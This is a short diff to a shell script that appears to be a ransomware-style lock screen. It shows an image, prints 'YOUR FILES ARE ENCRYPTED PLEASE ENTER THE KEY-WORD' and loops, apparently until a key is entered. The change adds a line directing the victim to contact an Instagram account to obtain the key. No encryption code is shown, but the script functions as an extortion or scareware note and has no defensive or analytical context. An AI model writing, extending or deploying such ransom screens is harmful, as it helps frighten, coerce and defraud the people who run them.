@@ -10,6 +10,7 @@ clear
 
 termimage IMG-20240228-WA0000.jpg
 echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
+echo -e "\033[7;49;93m CONTACT AT @bannedby_ on instagram.com to get key-word!\033[m"
 echo ""
 sleep 1
 while :
